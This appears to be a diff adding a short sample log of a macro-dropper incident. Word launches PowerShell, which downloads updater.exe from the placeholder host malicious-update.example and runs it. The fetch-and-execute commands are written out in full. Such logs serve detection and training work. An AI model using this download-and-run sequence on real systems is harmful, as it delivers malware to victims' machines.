@@ -1,0 +1,6 @@
+2026-08-24 09:09:18 [POWERSHELL] ParentProcess=winword.exe
+2026-08-24 09:09:18 [POWERSHELL] Process=powershell.exe
+2026-08-24 09:09:19 [POWERSHELL] Command=Invoke-WebRequest -Uri http://malicious-update.example/updater.exe -OutFile C:\Users\finance.user\Downloads\updater.exe
+2026-08-24 09:09:21 [POWERSHELL] Command=Start-Process C:\Users\finance.user\Downloads\updater.exe
+2026-08-24 09:09:22 [POWERSHELL] ProcessCreation=updater.exe
+2026-08-24 09:09:23 [POWERSHELL] Execution completed
